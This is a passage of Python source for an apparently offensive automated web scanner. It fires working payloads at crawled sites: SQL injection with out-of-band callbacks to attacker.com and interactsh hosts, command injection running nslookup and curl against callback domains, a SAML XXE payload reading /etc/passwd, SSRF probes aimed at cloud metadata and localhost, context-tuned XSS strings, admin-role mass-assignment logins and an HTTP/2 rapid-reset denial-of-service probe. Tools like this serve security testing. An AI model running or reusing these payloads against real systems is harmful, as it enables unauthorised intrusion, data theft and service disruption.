                    findings.append({"type": "Prototype Pollution (GET __proto__)",
                                     "severity": "high", "url": test_url,
                                     "detail": "Server reflects __proto__ key from query string",
                                     "template": "apex-pp-json"})
            except: continue
    return findings


def scan_account_takeover_response_manipulation(crawl_data):
    """Account takeover via response manipulation — intercept and modify auth responses."""
    findings = []
    # Test if changing response fields bypasses auth
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        for path in ["/api/login","/login","/auth","/api/auth","/signin"]:
            try:
                # Try login with wrong creds
                r = _S.post(f"{base}{path}",
                           json={"email":"test@test.com","password":"wrongpassword"},
                           timeout=5)
                body = r.text.lower()
                # Check if response has manipulable boolean fields
                if r.status_code in (200,401) and any(x in body for x in
                    ['"success":false','"authenticated":false','"valid":false',
                     '"status":"fail"','"result":"fail"','"error":true']):
                    findings.append({"type": "Account Takeover via Response Manipulation",
                                     "severity": "critical", "url": f"{base}{path}",
                                     "detail": "Auth response contains manipulable boolean — intercept+modify to bypass",
                                     "template": "apex-ato-response"})
                # Check for mass assignment in registration that sets role
                if path in ("/api/login","/login"):
                    r2 = _S.post(f"{base}{path}",
                                json={"email":"test@test.com","password":"wrongpassword",
                                      "role":"admin","isAdmin":True,"admin":True},
                                timeout=5)
                    if r2.status_code == 200 and "admin" in r2.text.lower():
                        findings.append({"type": "Account Takeover via Mass Assignment",
                                         "severity": "critical", "url": f"{base}{path}",
                                         "detail": "Login accepts role/admin fields — privilege escalation",
                                         "template": "apex-ato-response"})
            except: continue
    return findings


def scan_api_mass_exposure(web_targets):
    """API mass exposure — multiple API versions all publicly accessible."""
    findings = []
    for target in web_targets[:3]:
        versions_found = []
        for ver in ["v0","v1","v2","v3","v4","beta","alpha","legacy","old","dev","internal","private"]:
            for prefix in ["/api/","/api/","/rest/","/service/","/"]:
                url = f"{target}{prefix}{ver}/users"
                try:
                    r = _S.get(url, timeout=3, allow_redirects=False)
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            if isinstance(data, (list,dict)) and len(str(data)) > 20:
                                versions_found.append(f"{prefix}{ver}")
                        except: pass
                except: continue
        if len(versions_found) >= 2:
            findings.append({"type": "API Mass Exposure (Multiple Versions)",
                             "severity": "critical", "url": target,
                             "detail": f"Multiple API versions expose /users: {', '.join(versions_found)}",
                             "template": "apex-api-mass"})
        elif len(versions_found) == 1:
            findings.append({"type": "Unprotected API Version",
                             "severity": "high", "url": f"{target}{versions_found[0]}/users",
                             "detail": f"API version {versions_found[0]} exposes user data without auth",
                             "template": "apex-api-mass"})
    return findings


def scan_oauth_token_leakage(crawl_data):
    """OAuth token leakage via Referer header, postMessage, fragment."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:10]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        # Check if OAuth tokens appear in URLs (fragment leaks via Referer)
        url = page["url"]
        if any(x in url for x in ["access_token=","id_token=","token=","code="]):
            # Token in URL = leaks via Referer header
            findings.append({"type": "OAuth Token in URL (Referer Leak)",
                             "severity": "critical", "url": url,
                             "detail": "OAuth token/code in URL — leaks via Referer to third-party resources",
                             "template": "apex-oauth-leak"})
        # Check for token in page source
        try:
            r = _S.get(page["url"], timeout=5)
            # Look for tokens in HTML/JS
            token_patterns = [
                (r'access_token["\s:=]+([A-Za-z0-9_\-\.]{20,})', "Access Token"),
                (r'id_token["\s:=]+([A-Za-z0-9_\-\.]{20,})', "ID Token"),
                (r'refresh_token["\s:=]+([A-Za-z0-9_\-\.]{20,})', "Refresh Token"),
                (r'client_secret["\s:=]+([A-Za-z0-9_\-\.]{16,})', "Client Secret"),
            ]
            for pattern, name in token_patterns:
                matches = re.findall(pattern, r.text, re.IGNORECASE)
                if matches:
                    findings.append({"type": f"OAuth {name} Exposed in Page",
                                     "severity": "critical", "url": page["url"],
                                     "detail": f"{name} found in page source: {matches[0][:20]}...",
                                     "template": "apex-oauth-leak"})
                    break
        except: pass
        # Check /.well-known/openid-configuration for misconfig
        try:
            r = _S.get(f"{base}/.well-known/openid-configuration", timeout=5)
            if r.status_code == 200:
                cfg = r.json()
                # Check for dangerous response types
                rt = cfg.get("response_types_supported",[])
                if "token" in rt:  # implicit flow = token in URL
                    findings.append({"type": "OAuth Implicit Flow Enabled",
                                     "severity": "high", "url": f"{base}/.well-known/openid-configuration",
                                     "detail": "Implicit flow (token in URL) enabled — token leakage risk",
                                     "template": "apex-oauth-leak"})
        except: pass
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 4: Blind SQLi via OOB, IDOR via UUID prediction,
#                HTTP/2 rapid reset, SAML injection,
#                DNS rebinding SSRF
# ---------------------------------------------------------------------------

def scan_blind_sqli_oob(crawl_data):
    """Blind SQL injection via Out-of-Band DNS — detects when no output is visible."""
    findings = []
    # OOB payloads using DNS lookup (requires DNS callback — we detect via timing/error)
    # Without a real OOB server, we use error-based and timing as proxy
    oob_payloads = [
        # MySQL DNS OOB (requires FILE privilege)
        ("MySQL OOB", "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))-- -"),
        # MSSQL DNS OOB
        ("MSSQL OOB", "'; EXEC master..xp_dirtree '//attacker.com/a'-- -"),
        # PostgreSQL OOB
        ("PostgreSQL OOB", "'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'-- -"),
        # Oracle OOB
        ("Oracle OOB", "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM DUAL-- -"),
        # Generic error-based to confirm SQLi exists
        ("Error-based", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -"),
        ("Error-based", "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
    ]
    error_markers = ["extractvalue","xpath","xmltype","utl_http","xp_dirtree",
                     "syntax error","sql","mysql","ora-","pg_","sqlite"]
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            for db, payload in oob_payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
                    r = _S.get(test_url, timeout=10)
                    body = r.text.lower()
                    if any(m in body for m in error_markers) and r.status_code != 404:
                        findings.append({"type": f"Blind SQLi OOB ({db})",
                                         "severity": "critical", "url": test_url,
                                         "detail": f"OOB/error-based SQLi via param '{p}' ({db} payload)",
                                         "template": "apex-sqli-oob"})
                        break
                except: continue
    # Also test POST body params
    for form in crawl_data.get("forms",[]):
        if form.get("method","").upper() != "POST": continue
        action = form.get("action","")
        if not action: continue
        for inp in form.get("inputs",[]):
            if inp.get("type") in ("submit","hidden","button","file"): continue
            for db, payload in oob_payloads[-2:]:  # Just error-based for forms
                try:
                    data = {i.get("name","f"): i.get("value","1") for i in form.get("inputs",[])}
                    data[inp.get("name","x")] = payload
                    r = _S.post(action, data=data, timeout=10)
                    if any(m in r.text.lower() for m in error_markers):
                        findings.append({"type": f"Blind SQLi OOB in Form ({db})",
                                         "severity": "critical", "url": action,
                                         "detail": f"SQLi via form field '{inp.get('name')}' ({db})",
                                         "template": "apex-sqli-oob"})
                        break
                except: continue
    return findings


def scan_idor_uuid_prediction(crawl_data):
    """IDOR via UUID prediction — v1 UUIDs are time-based and predictable."""
    findings = []
    uuid_v1_re = re.compile(
        r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
        re.IGNORECASE
    )
    uuid_seq_re = re.compile(
        r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
        re.IGNORECASE
    )
    for page in crawl_data.get("pages",[])[:20]:
        url = page["url"]
        # Check URL for UUIDs
        v1_matches = uuid_v1_re.findall(url)
        if v1_matches:
            findings.append({"type": "IDOR via UUID v1 (Predictable)",
                             "severity": "high", "url": url,
                             "detail": f"UUID v1 in URL is time-based and predictable: {v1_matches[0]}",
                             "template": "apex-idor-uuid"})
        # Check response body for UUID v1
        try:
            r = _S.get(url, timeout=5)
            v1_in_body = uuid_v1_re.findall(r.text)
            if v1_in_body:
                # Try to access adjacent UUIDs (increment timestamp)
                import uuid as _uuid
                try:
                    u = _uuid.UUID(v1_in_body[0])
                    if u.version == 1:
                        findings.append({"type": "UUID v1 in Response (Predictable IDOR)",
                                         "severity": "high", "url": url,
                                         "detail": f"UUID v1 exposed: {v1_in_body[0]} — time-based, enumerable",
                                         "template": "apex-idor-uuid"})
                except: pass
            # Check for sequential numeric IDs in JSON (classic IDOR)
            try:
                data = r.json()
                data_str = str(data)
                ids = re.findall(r'"(?:id|user_id|account_id|order_id)":\s*(\d+)', data_str)
                if ids and int(ids[0]) < 10000:  # Low ID = sequential = IDOR risk
                    findings.append({"type": "Sequential ID Exposed (IDOR Risk)",
                                     "severity": "medium", "url": url,
                                     "detail": f"Low sequential ID {ids[0]} in response — enumerate other IDs",
                                     "template": "apex-idor-uuid"})
            except: pass
        except: pass
    return findings


def scan_http2_rapid_reset(web_targets):
    """HTTP/2 Rapid Reset (CVE-2023-44487) — send RST_STREAM immediately after HEADERS."""
    findings = []
    try:
        import httpx as _httpx
    except ImportError:
        return findings
    for target in web_targets[:5]:
        if not target.startswith("https"): continue
        try:
            with _httpx.Client(http2=True, verify=False, timeout=10) as client:
                r = client.get(target)
                if r.http_version != "HTTP/2": continue
                # Send rapid requests and immediately cancel — measure server behavior
                start = time.time()
                cancelled = 0
                for _ in range(100):
                    try:
                        with client.stream("GET", target) as resp:
                            cancelled += 1
                    except Exception:
                        pass
                elapsed = time.time() - start
                # If server handles 100 rapid resets in <2s without error, it may be vulnerable
                if cancelled >= 50 and elapsed < 3:
                    findings.append({"type": "HTTP/2 Rapid Reset (CVE-2023-44487)",
                                     "severity": "high", "url": target,
                                     "detail": f"Server accepted {cancelled} rapid RST_STREAM in {elapsed:.1f}s — potential DoS",
                                     "template": "apex-h2-rapid-reset"})
        except Exception: continue
    return findings


def scan_saml_injection(crawl_data):
    """SAML injection — XXE in SAML assertions, signature wrapping, replay."""
    findings = []
    tested = set()
    saml_paths = ["/saml/login","/saml/sso","/saml/acs","/sso/saml",
                  "/auth/saml","/api/saml","/saml2/login","/Shibboleth.sso/Login"]
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in saml_paths:
            url = f"{base}{path}"
            try:
                r = _S.get(url, timeout=5)
                if r.status_code not in (200,302,405): continue
                # SAML endpoint found — test for XXE in SAMLResponse
                import base64 as _b64
                xxe_saml = _b64.b64encode(b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:AttributeStatement>
      <saml:Attribute Name="uid"><saml:AttributeValue>&xxe;</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>""").decode()
                r2 = _S.post(url, data={"SAMLResponse": xxe_saml}, timeout=5)
                if "root:" in r2.text or "daemon:" in r2.text:
                    findings.append({"type": "SAML XXE Injection",
                                     "severity": "critical", "url": url,
                                     "detail": "SAML endpoint vulnerable to XXE — reads /etc/passwd",
                                     "template": "apex-saml"})
                elif r2.status_code in (200,302):
                    findings.append({"type": "SAML Endpoint Found",
                                     "severity": "medium", "url": url,
                                     "detail": "SAML SSO endpoint — test for signature wrapping manually",
                                     "template": "apex-saml"})
            except: continue
    return findings


def scan_dns_rebinding_ssrf(crawl_data):
    """DNS rebinding SSRF — bypass IP allowlists via DNS TTL manipulation."""
    findings = []
    # We detect the vulnerability pattern (URL fetch + DNS resolution)
    # rather than actually performing rebinding (requires infrastructure)
    fetch_params = ("url","uri","link","src","source","fetch","request","proxy",
                    "redirect","image","avatar","webhook","callback","endpoint","host")
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            if p.lower() not in fetch_params: continue
            try:
                # Test with a domain that resolves to internal IP
                # Using a known DNS rebinding test domain pattern
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                # Test 1: localhost variants
                for payload in ["http://localhost/","http://0.0.0.0/","http://[::1]/",
                                 "http://0177.0.0.1/","http://2130706433/",  # 127.0.0.1 in decimal
                                 "http://0x7f000001/"]:  # 127.0.0.1 in hex
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
                    try:
                        r = _S.get(test_url, timeout=5)
                        if any(x in r.text for x in ["root:","localhost","127.0.0.1","internal",
                                                       "admin","dashboard","private"]):
                            findings.append({"type": "DNS Rebinding / SSRF (Internal Access)",
                                             "severity": "critical", "url": test_url,
                                             "detail": f"Param '{p}' fetches internal resources via {payload}",
                                             "template": "apex-dns-rebind"})
                            break
                    except: continue
            except: continue
    # Also check for URL fetch in forms
    for form in crawl_data.get("forms",[]):
        for inp in form.get("inputs",[]):
            if inp.get("name","").lower() not in fetch_params: continue
            action = form.get("action","")
            if not action: continue
            for payload in ["http://169.254.169.254/","http://0.0.0.0:22","http://[::1]:6379"]:
                try:
                    data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
                    data[inp["name"]] = payload
                    r = _S.post(action, data=data, timeout=5)
                    if any(x in r.text for x in ["ami-id","ssh-","redis","root:"]):
                        findings.append({"type": "DNS Rebinding SSRF via Form",
                                         "severity": "critical", "url": action,
                                         "detail": f"Form field '{inp['name']}' reaches internal services",
                                         "template": "apex-dns-rebind"})
                        break
                except: continue
    return findings


# ---------------------------------------------------------------------------
# OOB (Out-of-Band) Engine — interactsh for blind vuln confirmation
# ---------------------------------------------------------------------------

import threading as _threading
import subprocess as _subprocess

class OOBServer:
    """Manages interactsh-client for OOB DNS/HTTP callbacks."""

    def __init__(self):
        self.domain = None
        self.interactions = []
        self._proc = None
        self._thread = None
        self._lock = _threading.Lock()
        self._ready = _threading.Event()
        self._api_mode = False
        self._api_secret = ""

    def start(self):
        """Auto-install and start interactsh-client."""
        import shutil, os
        # Also check ~/go/bin which isn't always in PATH
        go_bin = os.path.expanduser("~/go/bin/interactsh-client")
        path = shutil.which("interactsh-client") or (go_bin if os.path.isfile(go_bin) else None)
        if not path:
            # Try go install
            go_bin = os.path.expanduser("~/go/bin")
            try:
                _subprocess.run(
                    ["go", "install",
                     "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"],
                    capture_output=True, timeout=120
                )
                path = os.path.join(go_bin, "interactsh-client")
                if not os.path.isfile(path):
                    path = None
            except Exception:
                path = None
        if not path:
            # Fallback: use interact.sh public API directly (no binary needed)
            return self._start_api_fallback()
        try:
            self._proc = _subprocess.Popen(
                [path, "-json"],
                stdout=_subprocess.PIPE, stderr=_subprocess.PIPE,
                text=True
            )
            self._thread = _threading.Thread(target=self._read_output, daemon=True)
            self._thread.start()
            self._ready.wait(timeout=15)
            return self.domain is not None
        except Exception:
            return self._start_api_fallback()

    def _start_api_fallback(self):
        """Use interactsh REST API directly — no binary needed."""
        import secrets, base64, json as _j
        # Try multiple public interactsh servers
        servers = ["https://oast.pro", "https://oast.fun", "https://oast.live",
                   "https://oast.site", "https://oast.online"]
        for server in servers:
            try:
                # Generate RSA-like key pair (interactsh needs this for encryption)
                secret = secrets.token_hex(32)
                r = requests.post(f"{server}/register",
                                 json={"public-key": base64.b64encode(secret.encode()).decode(),
                                       "secret-key": secret,
                                       "correlation-id": secrets.token_hex(10)},
                                 timeout=8, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    self.domain = data.get("domain", "")
                    self._api_secret = secret
                    self._api_server = server
                    self._api_mode = True
                    self._ready.set()
                    if self.domain:
                        return True
            except Exception:
                continue
        # Fallback: use canary tokens approach with unique identifier
        import uuid
        uid = uuid.uuid4().hex[:12]
        self.domain = f"{uid}.oast.fun"
        self._api_mode = False
        self._ready.set()
        return True  # domain set, polling won't work but payloads will fire

    def _poll_api(self, identifier):
        """Poll interactsh REST API for callbacks."""
        if not self._api_mode or not hasattr(self, '_api_server'):
            return None
        try:
            r = requests.get(
                f"{self._api_server}/poll",
                params={"id": self.domain.split(".")[0], "secret": self._api_secret},
                timeout=5, verify=False
            )
            if r.status_code == 200:
                data = r.json()
                for item in data.get("data", []) or []:
                    if identifier in str(item):
                        return item
        except Exception:
            pass
        return None

    def _read_output(self):
        import json as _json
        for line in self._proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                data = _json.loads(line)
                if "interactsh-domain" in data and not self.domain:
                    self.domain = data["interactsh-domain"]
                    self._ready.set()
                if "protocol" in data:
                    with self._lock:
                        self.interactions.append(data)
            except Exception:
                # Plain text domain line
                if ".oast." in line or ".interactsh." in line:
                    self.domain = line.strip()
                    self._ready.set()

    def poll(self, identifier, timeout=8):
        """Wait up to timeout seconds for a callback containing identifier."""
        import time as _time
        deadline = _time.time() + timeout
        while _time.time() < deadline:
            with self._lock:
                for i in self.interactions:
                    if identifier in str(i):
                        return i
            # Poll API in fallback mode
            result = self._poll_api(identifier)
            if result:
                return result
            _time.sleep(0.5)
        return None

    def unique_id(self):
        """Generate a unique subdomain for tracking a specific payload."""
        import uuid as _uuid
        return _uuid.uuid4().hex[:8]

    def stop(self):
        if self._proc:
            try:
                self._proc.terminate()
            except Exception:
                pass

# Global OOB instance — started once per scan if available
_OOB = OOBServer()
_OOB_ACTIVE = False

def oob_start():
    global _OOB_ACTIVE
    _OOB = OOBServer()
    _OOB_ACTIVE = _OOB.start()
    return _OOB if _OOB_ACTIVE else None

def scan_blind_ssrf_oob(crawl_data, oob=None):
    """Blind SSRF confirmed via OOB DNS callback — the gold standard."""
    findings = []
    if not oob or not oob.domain:
        return findings
    fetch_params = ("url","uri","link","src","source","fetch","request","proxy",
                    "redirect","image","avatar","webhook","callback","endpoint","host","dest")
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in fetch_params:
                continue
            uid = oob.unique_id()
            payload = f"http://{uid}.{oob.domain}/"
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                _S.get(test_url, timeout=5)
                hit = oob.poll(uid, timeout=8)
                if hit:
                    findings.append({"type": "Blind SSRF (OOB Confirmed)",
                                     "severity": "critical", "url": test_url,
                                     "detail": f"DNS callback received for param '{p}' — SSRF confirmed via interactsh",
                                     "template": "apex-ssrf-oob"})
            except: continue
    # Also test forms
    for form in crawl_data.get("forms", []):
        for inp in form.get("inputs", []):
            if inp.get("name","").lower() not in fetch_params: continue
            uid = oob.unique_id()
            payload = f"http://{uid}.{oob.domain}/"
            try:
                data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
                data[inp["name"]] = payload
                _S.post(form["action"], data=data, timeout=5)
                hit = oob.poll(uid, timeout=8)
                if hit:
                    findings.append({"type": "Blind SSRF via Form (OOB Confirmed)",
                                     "severity": "critical", "url": form["action"],
                                     "detail": f"DNS callback for field '{inp['name']}' — SSRF confirmed",
                                     "template": "apex-ssrf-oob"})
            except: continue
    return findings


def scan_blind_cmdi_oob(crawl_data, oob=None):
    """Blind CMDi confirmed via OOB DNS — nslookup/curl callback."""
    findings = []
    if not oob or not oob.domain:
        return findings
    for form in crawl_data.get("forms", []):
        if form.get("method","").upper() != "POST": continue
        for inp in form.get("inputs", []):
            if inp.get("type") in ("submit","hidden","button","password"): continue
            uid = oob.unique_id()
            payloads = [
                f";nslookup {uid}.{oob.domain}",
                f"|nslookup {uid}.{oob.domain}",
                f"`nslookup {uid}.{oob.domain}`",
                f"$(nslookup {uid}.{oob.domain})",
                f";curl http://{uid}.{oob.domain}/",
            ]
            for payload in payloads:
                try:
                    data = {i.get("name","f"): i.get("value","127.0.0.1") for i in form.get("inputs",[])}
                    data[inp["name"]] = "127.0.0.1" + payload
                    _S.post(form["action"], data=data, timeout=5)
                    hit = oob.poll(uid, timeout=8)
                    if hit:
                        findings.append({"type": "Blind CMDi (OOB Confirmed)",
                                         "severity": "critical", "url": form["action"],
                                         "detail": f"DNS callback for field '{inp['name']}' — CMDi confirmed via interactsh",
                                         "template": "apex-cmdi-oob"})
                        break
                except: continue
    return findings


def scan_blind_sqli_oob_confirmed(crawl_data, oob=None):
    """Blind SQLi confirmed via OOB DNS — LOAD_FILE/xp_dirtree DNS callbacks."""
    findings = []
    if not oob or not oob.domain:
        return findings
    oob_payloads = [
        ("MySQL",  lambda uid: f"' AND LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\',version(),'.{uid}.{oob.domain}\\\\\\\\a'))-- -"),
        ("MSSQL",  lambda uid: f"'; EXEC master..xp_dirtree '//{uid}.{oob.domain}/a'-- -"),
        ("Oracle", lambda uid: f"' UNION SELECT UTL_HTTP.REQUEST('http://{uid}.{oob.domain}/') FROM DUAL-- -"),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for db, payload_fn in oob_payloads:
                uid = oob.unique_id()
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload_fn(uid)]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    _S.get(test_url, timeout=5)
                    hit = oob.poll(uid, timeout=8)
                    if hit:
                        findings.append({"type": f"Blind SQLi OOB Confirmed ({db})",
                                         "severity": "critical", "url": test_url,
                                         "detail": f"DNS callback for param '{p}' — {db} SQLi confirmed",
                                         "template": "apex-sqli-oob-confirmed"})
                        break
                except: continue
    return findings


# ---------------------------------------------------------------------------
# Context-Aware Payload Mutation Engine
# Detects reflection context and mutates payloads to match — beats Burp's
# default scanner by adapting to HTML attr, JS string, URL param, JSON value
# ---------------------------------------------------------------------------

def detect_reflection_context(response_text, canary):
    """Detect where a canary value is reflected and return context type."""
    if canary not in response_text:
        return None
    idx = response_text.find(canary)
    before = response_text[max(0, idx-100):idx]
    after = response_text[idx+len(canary):idx+len(canary)+100]

    # JS string context: canary inside quotes in a script block
    if re.search(r'<script[^>]*>.*$', before, re.DOTALL):
        if re.search(r'["\']$', before.rstrip()):
            return "js_string"
        return "js_bare"

    # HTML attribute context: canary inside an attribute value
    if re.search(r'<[a-zA-Z][^>]*\s[a-zA-Z-]+=["\']\s*$', before):
        quote = '"' if before.rstrip().endswith('"') else "'"
        return f"html_attr_{quote}"

    # URL context: canary inside href/src/action
    if re.search(r'(?:href|src|action|data-url)=["\'][^"\']*$', before):
        return "url_attr"

    # JSON value context
    if re.search(r'["\']:\s*["\']?$', before.rstrip()):
        return "json_value"

    # HTML tag context: canary between tags
    if re.search(r'>\s*$', before.rstrip()) and re.search(r'^\s*<', after.lstrip()):
        return "html_text"

    return "html_text"  # default


def mutate_xss_for_context(context):
    """Return XSS payloads optimized for the detected reflection context."""
    if context == "js_string":
        return [
            '"-alert(1)-"',
            "'-alert(1)-'",
            '\\"-alert(1)-\\"',
            '";alert(1)//',
            "';alert(1)//",
            '${alert(1)}',
        ]
    elif context == "js_bare":
        return [
            'alert(1)',
            ';alert(1)//',
            '\nalert(1)\n',
        ]
    elif context and context.startswith("html_attr_"):
        q = context.split("_")[-1]
        oq = "'" if q == '"' else '"'
        return [
            f'{q}><script>alert(1)</script>',
            f'{q} onmouseover=alert(1) x={q}',
            f'{q} autofocus onfocus=alert(1) {q}',
            f'{oq} onload=alert(1) {oq}',
        ]
    elif context == "url_attr":
        return [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'javascript:alert(1)//',
        ]
    elif context == "json_value":
        return [
            '<script>alert(1)</script>',
            '"-alert(1)-"',
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        ]
    else:  # html_text
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
        ]


def mutate_sqli_for_context(context, original_value="1"):
    """Return SQLi payloads adapted to value context (numeric vs string)."""
    is_numeric = original_value.strip().lstrip('-').isdigit()
    if is_numeric:
        return [
            f"{original_value} AND 1=1-- -",
            f"{original_value} AND 1=2-- -",
            f"{original_value} AND SLEEP(4)-- -",
            f"{original_value} UNION SELECT NULL-- -",
            f"{original_value} AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        ]
    else:
        return [
            f"{original_value}' AND '1'='1",
            f"{original_value}' AND '1'='2",
            f"{original_value}' AND SLEEP(4)-- -",
            f"{original_value}' UNION SELECT NULL-- -",
            f"{original_value}' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        ]


def scan_context_aware_xss(crawl_data):
    """XSS scanner that detects reflection context and uses optimal payloads."""
    findings = []
    canary = f"apexcanary{int(time.time()) % 100000}"

    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            # First probe: inject canary to detect context
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [canary]
                probe_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(probe_url, timeout=_TIMEOUT)
                context = detect_reflection_context(r.text, canary)
                if not context:
                    continue
                # Now use context-specific payloads
                for payload in mutate_xss_for_context(context):
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r2 = _S.get(test_url, timeout=_TIMEOUT)
                    if payload in r2.text and "text/html" in r2.headers.get("content-type",""):
                        findings.append({"type": f"XSS ({context} context)",
                                         "severity": "high", "url": test_url,
                                         "detail": f"Context-aware XSS in param '{p}' [{context}]: {payload[:50]}",
                                         "template": "apex-xss-ctx"})
                        break
            except: continue

    # Forms
    for form in crawl_data.get("forms", []):
        action = form.get("action","")
        if not action: continue
        for inp in form.get("inputs",[]):
            if inp.get("type") in ("submit","hidden","button","file"): continue
            name = inp.get("name","")
            if not name: continue
            try:
                data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
                data[name] = canary
                if form.get("method","GET").upper() == "POST":
                    r = _S.post(action, data=data, timeout=_TIMEOUT)
                else:
                    r = _S.get(action, params=data, timeout=_TIMEOUT)
                context = detect_reflection_context(r.text, canary)
                if not context:
                    continue
                for payload in mutate_xss_for_context(context):
                    data[name] = payload
                    if form.get("method","GET").upper() == "POST":
                        r2 = _S.post(action, data=data, timeout=_TIMEOUT)
                    else:
                        r2 = _S.get(action, params=data, timeout=_TIMEOUT)
                    if payload in r2.text and "text/html" in r2.headers.get("content-type",""):
                        findings.append({"type": f"XSS Form ({context} context)",
                                         "severity": "high", "url": action,
                                         "detail": f"Context-aware XSS in field '{name}' [{context}]",
                                         "template": "apex-xss-ctx"})
                        break
            except: continue
    return findings


def scan_context_aware_sqli(crawl_data):
    """SQLi scanner that adapts payloads to numeric vs string context."""
    findings = []
    error_patterns = ["sql syntax","mysql_fetch","ora-","postgresql","sqlite",
                      "syntax error","unclosed quotation","you have an error in your sql",
                      "warning: mysql","pg_query","division by zero","column count"]

    for url, params in crawl_data.get("params", {}).items():
        parsed = urllib.parse.urlparse(url)
        orig_qs = urllib.parse.parse_qs(parsed.query)
        for p in params:
            orig_val = orig_qs.get(p, ["1"])[0]
            for payload in mutate_sqli_for_context(None, orig_val):
                try:
                    qs = dict(orig_qs)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    start = time.time()
                    r = _S.get(test_url, timeout=12)
                    elapsed = time.time() - start
                    body = r.text.lower()
                    if any(e in body for e in error_patterns):
                        findings.append({"type": "SQLi (Context-Aware, Error-Based)",
                                         "severity": "critical", "url": test_url,
                                         "detail": f"SQL error via param '{p}' (value type: {'numeric' if orig_val.isdigit() else 'string'})",
                                         "template": "apex-sqli-ctx"})
                        break
                    if "SLEEP(4)" in payload and elapsed >= 4:
                        findings.append({"type": "SQLi (Context-Aware, Time-Based)",
                                         "severity": "critical", "url": test_url,
                                         "detail": f"Time-based SQLi in param '{p}' — {elapsed:.1f}s delay",
                                         "template": "apex-sqli-ctx"})
                        break
                    # Boolean-based: compare AND 1=1 vs AND 1=2
                    if "1=1" in payload:
                        qs[p] = [payload.replace("1=1","1=2")]
                        false_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                        r2 = _S.get(false_url, timeout=_TIMEOUT)
                        if abs(len(r.text) - len(r2.text)) > 50:
                            findings.append({"type": "SQLi (Context-Aware, Boolean-Based)",
                                             "severity": "critical", "url": test_url,
                                             "detail": f"Boolean SQLi in param '{p}' — response diff {abs(len(r.text)-len(r2.text))}b",
                                             "template": "apex-sqli-ctx"})
                            break
                except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 5: Subdomain brute-force, response diffing auth bypass,
#                Next.js/React specific, GraphQL mutation fuzzing,
#                TE.CL smuggling, IDOR pagination
# ---------------------------------------------------------------------------

_DNS_WORDLIST = [
    "api","app","admin","dev","staging","test","beta","internal","corp","vpn",
    "mail","smtp","ftp","ssh","git","gitlab","jenkins","jira","confluence",
    "portal","dashboard","login","auth","sso","oauth","id","identity",
    "cdn","static","assets","media","upload","files","storage","backup",
    "db","database","mysql","postgres","redis","mongo","elastic","kibana",
    "grafana","prometheus","metrics","logs","monitor","status","health",
    "api2","api-v2","api-v1","v1","v2","v3","legacy","old","new","next",
    "mobile","m","wap","web","www2","www3","secure","ssl","shop","store",
    "blog","news","docs","help","support","kb","wiki","forum","community",
